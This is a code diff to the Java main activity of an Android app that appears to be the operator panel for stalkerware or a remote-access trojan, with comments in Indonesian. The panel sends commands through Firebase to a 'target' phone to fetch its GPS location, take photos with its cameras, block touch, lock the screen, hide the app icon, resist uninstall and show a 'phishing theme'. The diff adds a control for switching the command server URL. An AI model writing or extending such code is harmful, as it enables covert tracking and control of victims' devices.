@@ -31,6 +31,8 @@ public class MainActivity extends AppCompatActivity {
     private TextView tvDeviceName, tvDeviceId, tvBattery, tvStatus;
     private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus;
     private Switch swAntiUninstall, swFlashlight, swLockLow, swLockCustom, swHideIcon;
+    private EditText etServerUrl;
+    private Button btnSetServer;
     private static final int REQUEST_VIDEO = 1001;
 
     private ValueEventListener deviceListener;
@@ -66,6 +68,9 @@ public class MainActivity extends AppCompatActivity {
         swLockCustom = findViewById(R.id.swLockCustom);
         swHideIcon = findViewById(R.id.swHideIcon);
 
+        etServerUrl = findViewById(R.id.etServerUrl);
+        btnSetServer = findViewById(R.id.btnSetServer);
+
         Button btnGanti = findViewById(R.id.btnGanti);
         Button btnTemaPhising = findViewById(R.id.btnTemaPhising);
         Button btnVideoOverlay = findViewById(R.id.btnVideoOverlay);
@@ -79,6 +84,18 @@ public class MainActivity extends AppCompatActivity {
         listenStatusRealtime();
         listenGPSRealtime();
         listenCameraRealtime();
+
+        // ===== FITUR GANTI SERVER =====
+        btnSetServer.setOnClickListener(v -> {
+            String newUrl = etServerUrl.getText().toString().trim();
+            if (!newUrl.isEmpty()) {
+                mDatabase.child("serverUrl").setValue(newUrl);
+                Toast.makeText(this, "✅ Server URL diubah!", Toast.LENGTH_SHORT).show();
+                etServerUrl.setText("");
+            } else {
+                Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
+            }
+        });
 
         swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
             mDatabase.child("antiUninstall").setValue(isChecked);
@@ -154,13 +171,11 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
         });
 
-        // GPS — langsung buka Google Maps
         btnGPS.setOnClickListener(v -> {
             mDatabase.child("command").setValue("gps");
             Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
         });
 
-        // Kamera — ambil foto target
         btnKamera.setOnClickListener(v -> {
             AlertDialog.Builder builder = new AlertDialog.Builder(this);
             builder.setTitle("📸 Pilih Kamera Target");
@@ -180,24 +195,20 @@ public class MainActivity extends AppCompatActivity {
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 String loc = snapshot.getValue(String.class);
                 if (loc != null && !loc.isEmpty()) {
-                    // Format: "lat,lon"
                     String[] parts = loc.split(",");
                     if (parts.length == 2) {
                         String lat = parts[0].trim();
                         String lon = parts[1].trim();
-                        // Langsung buka Google Maps
                         String uri = "geo:" + lat + "," + lon + "?q=" + lat + "," + lon;
                         Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
                         intent.setPackage("com.google.android.apps.maps");
                         if (intent.resolveActivity(getPackageManager()) != null) {
                             startActivity(intent);
                         } else {
-                            // Kalo gak ada Google Maps, pake browser
                             intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://maps.google.com/?q=" + lat + "," + lon));
                             startActivity(intent);
                         }
                         Toast.makeText(MainActivity.this, "📍 Lokasi: " + lat + ", " + lon, Toast.LENGTH_SHORT).show();
-                        // Hapus setelah dibaca
                         mDatabase.child("gpsLocation").removeValue();
                     }
                 }
@@ -215,11 +226,9 @@ public class MainActivity extends AppCompatActivity {
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 String photoUrl = snapshot.getValue(String.class);
                 if (photoUrl != null && !photoUrl.isEmpty()) {
-                    // Buka foto di browser/Intent
                     Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(photoUrl));
                     startActivity(intent);
                     Toast.makeText(MainActivity.this, "📸 Foto berhasil diambil!", Toast.LENGTH_SHORT).show();
-                    // Hapus setelah dibaca
                     mDatabase.child("photoUrl").removeValue();
                 }
             }
@@ -390,4 +399,4 @@ public class MainActivity extends AppCompatActivity {
         if (gpsListener != null) mDatabase.child("gpsLocation").removeEventListener(gpsListener);
         if (cameraListener != null) mDatabase.child("photoUrl").removeEventListener(cameraListener);
     }
-                                                        }
+                            }
